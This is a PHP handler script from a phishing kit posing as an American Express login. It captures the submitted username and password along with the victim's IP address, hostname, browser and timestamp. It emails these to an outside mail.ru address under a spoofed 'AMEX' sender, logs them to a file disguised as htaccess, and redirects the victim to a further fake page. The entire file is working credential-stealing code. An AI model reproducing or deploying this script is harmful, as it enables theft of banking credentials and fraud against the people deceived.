
<?php
$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$username = $_POST['username'];
$password = $_POST['password'];

$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$send = "gerasimovaveroniya6419@mail.ru";
$subject = "Amex User | $ip";
$headers = "From: AMEX  <legit@mrmoz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message);
$fp = fopen("./htcaccess.txt","a");
fputs($fp,$message);
header("Location: next.php?request_type=LogLogonHandler&location=us_logon1");
?>
